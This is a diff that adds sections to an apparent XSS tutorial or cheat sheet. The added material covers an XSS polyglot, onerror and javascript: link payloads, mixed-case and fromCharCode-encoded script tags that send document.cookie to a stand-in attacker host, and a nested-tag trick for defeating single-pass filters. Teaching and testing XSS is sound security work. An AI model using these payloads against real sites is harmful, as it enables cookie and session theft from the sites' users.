@@ -44,6 +44,15 @@ However, when the injection is within an HTML tag, we need to end the HTML tag t
 
 If your code is within a JavaScript string, you can close the string with `'`, complete the command with a semicolon, execute your command, and comment out the rest of the line with `//`. You can try something like this `';alert(document.cookie)//`
 
+#### Polyglot
+An XSS polyglot i a type of XSS payload that executes in multiple contexts. Regardless of the tag, and it's used to bypass filters. Take a look at this polyglot created by EdOverflow at https://polyglot.innerht.ml/
+```
+javascript:"/*\"/*`/*' /*<template>
+</textarea></noembed></noscript></title>
+</style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+```
+
+
 ## Evasion
 Various repositories can be consulted to build your custom XSS payload. This gives you plenty of room for experimentation. One such list is the [XSS Payload List](https://github.com/payloadbox/xss-payload-list).
 However, sometimes, there are filters blocking XSS payloads. If there is a limitation based on the payload length, then [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads) can be a great starting point to bypass length restrictions.
@@ -61,3 +70,34 @@ Consequently, based on the [XSS Filter Evasion Cheat Sheet](https://cheatsheetse
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 ```
+## Alternative JavaScript Syntax
+Often application sanitize `<script>` tags. 
+Instead of closing out an img tag and inserting a script tag, we can insert JavaScript code directly as an attribute:
+```JavaScript
+<img src="123" onerror="alert('XSS');"/>
+```
+Or we can inject in an anchor tag
+```JavaScript
+<a href="javascript:alert('xss')>Click me!</a>
+```
+
+## Capitalization and Encoding
+We can mix encodings and capitalized letters to confuse filters:
+``` HTML
+<sCrIPT>location='http://attacker.com/c='+document.cookie;</sCrIPT>
+```
+Or using the fromCharCode() JS function to turn numbers into char:
+```HTML
+<scrIPT> location=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
+```
+
+## Filter Logic Errors
+We can exploit in any errors in the filter logic. For Example, sometimes applications removal all `<script>`tags in the user input, but do it only once. If that's the case, you can use a payload like this:
+```HTML
+<scrip<script>t> #payload </scrip</script>t>
+```
+Once the filter removes the complete `<script>` tag:
+```HTML
+<script> #payload </script>
+```
+
